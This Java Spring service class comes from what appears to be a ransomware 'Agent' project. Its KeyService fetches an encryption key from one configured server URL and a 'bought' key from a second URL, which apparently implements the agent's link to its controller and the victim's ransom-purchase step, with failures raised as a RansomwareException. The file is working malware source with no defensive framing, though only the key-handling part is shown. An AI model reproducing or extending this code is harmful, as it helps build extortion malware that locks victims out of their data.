package Agent.services;

import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import com.github.raychatter.ExceptionHandler;

import Agent.Utils.HttpUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.JsonException;
import Agent.exceptions.RansomwareException;

@Service
@ExceptionHandler
public class KeyService {
	@Value("${server.url.get}")
	private String urlgetKey;
	@Value("${server.url.buy}")
	private String urlbuyKey;

	public CryptoKey getKey() throws RansomwareException {

		try {
			return (CryptoKey) ((JSONObject) HttpUtil.get(urlgetKey)).get("CryptoKey");
		} catch (JSONException e) {
			throw new JsonException(e.getMessage(), e.getCause());
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}
	}

	public CryptoKey buykey() throws RansomwareException {

		try {
			return (CryptoKey) ((JSONObject) HttpUtil.get(urlbuyKey)).get("CryptoKey");
		} catch (JSONException e) {
			throw new JsonException(e.getMessage(), e.getCause());
		} catch (RansomwareException e) {
			throw new RansomwareException(e.getMessage(), e.getCause());
		}
	}
}